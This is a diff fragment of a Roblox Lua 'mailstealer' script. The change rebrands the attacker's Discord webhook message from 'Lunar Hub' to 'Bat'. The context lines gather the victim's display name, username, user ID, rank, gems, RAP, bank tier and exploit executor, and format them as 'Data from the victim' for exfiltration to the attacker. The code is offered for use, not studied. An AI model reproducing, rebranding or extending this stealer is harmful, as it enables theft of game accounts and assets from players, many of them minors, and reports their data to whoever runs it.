@@ -44,10 +44,10 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**Lunar Hub on top ngl**",
+	["content"]= "**Bat on top ngl**",
 	["embeds"]= {
 	  {
-		["title"]= "`Lunar Hub Mailstealer Results`",
+		["title"]= "`Bat Mailstealer Results`",
 		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.."\nðŸ±Rank: ".._G.CurrentRank.."\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
 		["url"]= "https://discord.gg/34fs3FWt",
 		["color"]= ""..webhookcolor.."",
